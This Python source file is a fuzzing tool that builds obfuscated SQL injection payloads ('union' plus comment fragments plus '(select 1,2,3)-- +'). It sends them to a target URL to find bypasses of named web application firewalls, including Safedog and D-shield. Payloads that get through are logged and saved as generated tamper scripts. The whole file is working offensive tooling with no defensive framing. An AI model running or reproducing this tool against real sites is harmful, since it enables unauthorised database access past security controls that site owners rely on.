import requests
from core import core_rule,core_tamper
from config import settings
import random
import string
from urllib.parse import quote

txt_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))

class fuzz:


    def Ddun_start(self,url,strs):


        fuzz = core_rule.rule.dseaf_rule_base(object)
        fuzz_payload = core_rule.rule.Comment_rule_base(object)


        url_start = url

        for start in fuzz_payload['start']:
            for a in fuzz['fuzz_sz']:
                for b in fuzz['fuzz_sz']:
                    for c in fuzz['fuzz_zs']:
                        ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))
                        txt_str1 = ''.join(random.sample(string.ascii_letters + string.digits, 2))
                        payload = start+txt_str1+quote(a)+txt_str1+quote(b)+c+fuzz_payload['end'][0]
                        tamper = core_tamper.tamper.return_def_tamper(payload)
                        exp = "union" + payload + "(select%201,2,3)-- +"
                        url = url_start + exp
                        print(url)
                        res = requests.get(url=url, headers=settings.settings.headers)
                        # print(res.text.find("true"))
                        if res.text.find("true") == -1:
                            if strs in res.text:
                                print("【*】Find Fuzz bypass:" + url + " | payload:" + payload)
                                if settings.settings.tamper_open:
                                    print("【+】Write Tamper: /tamper/" + ran_str + ".py")
                                    with open('tamper/' + ran_str + '.py', 'w') as f:
                                        f.write(tamper)
                                if settings.settings.save_open:
                                    if settings.settings.save_method == "txt":
                                        print("【+】Write Txt Log: /tamper/" + txt_str + ".txt")
                                        with open(settings.settings.save_url + txt_str + '.txt', 'a') as f:
                                            f.write(url + '\n')

    def fuzz_start(self,url,strs):
        fuzz = core_rule.rule.default_rule_base(object)
        fuzz_payload = core_rule.rule.safedog_rule_base(object)
        url_start = url
        for a in fuzz:
            for b in fuzz:
                for c in fuzz:
                    for d in fuzz:
                        ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))
                        payload = str(fuzz_payload[0])+a+b+c+d+str(fuzz_payload[1])
                        tamper = core_tamper.tamper.return_def_tamper(payload)
                        exp = "union"+payload+"(select%201,2,3)-- +"
                        url = url_start + exp
                        #print(url)
                        res = requests.get(url = url , headers = settings.settings.headers)
                        #print(res.text.find("true"))
                        if res.text.find("true")==-1:
                            if strs in res.text:
                                print("【*】Find Fuzz bypass:"+url + " | payload:"+payload)
                                if settings.settings.tamper_open:
                                    print("【+】Write Tamper: /tamper/"+ran_str+".py")
                                    with open('tamper/'+ran_str+'.py','w') as f:
                                        f.write(tamper)

                                if settings.settings.save_open:
                                    if settings.settings.save_method == "txt":
                                        print("【+】Write Txt Log: /tamper/" + txt_str + ".txt")
                                        with open(settings.settings.save_url + txt_str + '.txt', 'a') as f:
                                            f.write(url+'\n')

